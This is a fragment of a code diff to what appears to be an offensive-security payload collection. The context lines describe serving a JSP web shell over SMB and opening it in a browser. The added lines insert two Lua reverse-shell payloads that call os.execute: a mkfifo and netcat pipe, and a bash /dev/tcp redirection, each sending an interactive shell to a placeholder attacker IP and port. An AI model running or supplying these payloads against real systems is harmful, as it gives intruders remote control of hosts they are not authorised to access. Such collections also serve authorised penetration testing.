@@ -1749,4 +1749,9 @@ payload:
       => sudo smbserver.py -smb2support -debug -comment "test" data /pathto/data-smbserver
       => copy shell.jsp (rename shell.war) to /pathto/data-smbserver/.
       => access http://10.10.10.10/shell.jsp
+  lua:
+    - |
+      os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f")
+    - |
+      os.execute("bash -i >& /dev/tcp/{IP}/{PORT} 0>&1")
 """
